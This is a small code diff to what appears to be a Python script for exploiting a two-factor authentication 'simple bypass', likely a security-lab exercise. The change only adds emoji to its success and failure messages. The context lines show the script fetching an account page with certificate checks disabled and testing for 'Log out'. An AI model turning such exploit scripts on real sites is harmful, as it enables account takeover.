@@ -42,9 +42,9 @@ def exploit_2fa_simple_bypass(url) :
     response = session.get(mypage_url, verify=False, proxies=proxies)
     
     if "Log out" in response.text:
-        print("exploit Success")
+        print("[🎉] Exploit Success")
     else :
-        print("exploit Failed")
+        print("[🧨] Exploit Failed")
 
     
 def main():
